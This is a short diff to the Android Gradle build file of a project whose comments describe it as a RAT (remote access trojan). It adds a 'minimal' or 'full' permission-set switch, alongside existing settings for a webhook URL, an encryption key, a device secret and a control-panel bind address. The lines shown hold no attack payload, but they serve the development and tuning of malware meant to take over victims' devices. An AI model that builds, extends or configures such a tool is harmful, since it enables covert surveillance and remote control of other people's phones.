@@ -39,6 +39,9 @@ android {
         def encryptionKey = (localProperties['ENCRYPTION_KEY'] ?: "").trim().replace("\"", "").replace("'", "")
         def deviceSecret = (localProperties['DEVICE_SECRET'] ?: "").trim().replace("\"", "").replace("'", "")
         def panelBind = (localProperties['PANEL_BIND_ADDRESS'] ?: "127.0.0.1").trim().replace("\"", "").replace("'", "")
+        // [SLIM] Permission set selector: "minimal" (core RAT capabilities only, default)
+        // or "full" (all 15 steps). See PermissionActivity.isNonCoreStep.
+        def permissionSet = (localProperties['PERMISSION_SET'] ?: "minimal").toString().trim()
 
         if (webhookUrl.isEmpty()) {
             println "-------------------------------------------------------------------------"
@@ -64,6 +67,8 @@ android {
         // [SECURITY] The in-app 9191 panel binds to loopback by default; set
         // PANEL_BIND_ADDRESS=0.0.0.0 in local.properties only for IPv6 direct-connect mode.
         buildConfigField "String", "PANEL_BIND_ADDRESS", "\"${panelBind}\""
+        // [SLIM] Permission set: "minimal" (default) or "full".
+        buildConfigField "String", "PERMISSION_SET", "\"${permissionSet}\""
     }
 
     signingConfigs {
